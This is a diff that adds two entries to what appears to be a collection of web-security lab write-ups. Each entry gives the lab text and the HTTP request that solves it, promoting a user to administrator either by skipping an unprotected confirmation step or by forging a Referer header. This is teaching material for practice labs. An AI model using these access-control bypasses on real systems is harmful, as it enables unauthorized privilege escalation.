@@ -235,6 +235,38 @@ replace admin=false by admin=true
 
 > Congratulations, you solved the lab!
 
+---
+
+```
+Lab: Multi-step process with no access control on one step
+
+PRACTITIONER
+
+This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+```
+```
+POST /admin-roles
+action=upgrade&confirmed=true&username=wiener
+```
+
+
+---
+
+```
+Lab: Referer-based access control
+
+PRACTITIONER
+
+This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+```
+```
+GET /admin-roles?username=wiener&action=upgrade
+Referer: https://0a9b00170444c36f81d95ca5008400be.web-security-academy.net/admin
+```
 
 ---
 
